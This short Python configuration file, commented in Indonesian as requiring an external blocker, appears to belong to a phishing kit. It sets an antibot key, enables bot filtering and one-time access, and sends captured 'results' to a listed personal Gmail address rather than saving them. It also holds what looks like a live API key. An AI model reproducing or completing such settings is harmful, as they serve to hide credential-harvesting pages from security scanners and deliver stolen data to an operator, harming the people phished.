'''
Wajib Menggunakan Blocker External
'''
antibot_key = '43e78258c4c7968d5d40af1e75bdfa5f'
antibot = True
save_result = False
send_result = True
emails_result = 'imamsurya890@gmail.com'
onetime_access = True
